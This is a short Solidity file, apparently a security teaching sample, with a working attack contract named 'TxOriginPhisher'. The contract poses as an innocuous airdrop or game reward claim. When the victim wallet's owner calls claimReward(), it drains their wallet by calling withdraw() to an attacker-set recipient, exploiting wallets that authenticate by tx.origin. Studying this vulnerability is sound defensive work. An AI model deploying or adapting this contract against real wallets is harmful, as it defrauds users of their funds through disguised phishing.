// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

interface ITxOriginWallet {
    function withdraw(address payable recipient) external;
}

/**
 * A contract disguised as something innocuous (an "airdrop claim", a game, etc).
 * When the real wallet owner calls claimReward() directly, tx.origin inside the
 * wallet is still that owner, even though the wallet's withdraw() was actually
 * called by THIS contract, not by the owner themself.
 */
contract TxOriginPhisher {
    ITxOriginWallet public wallet;
    address payable public attackerRecipient;

    constructor(address _wallet, address payable _attackerRecipient) {
        wallet = ITxOriginWallet(_wallet);
        attackerRecipient = _attackerRecipient;
    }

    function claimReward() external {
        wallet.withdraw(attackerRecipient);
    }
}
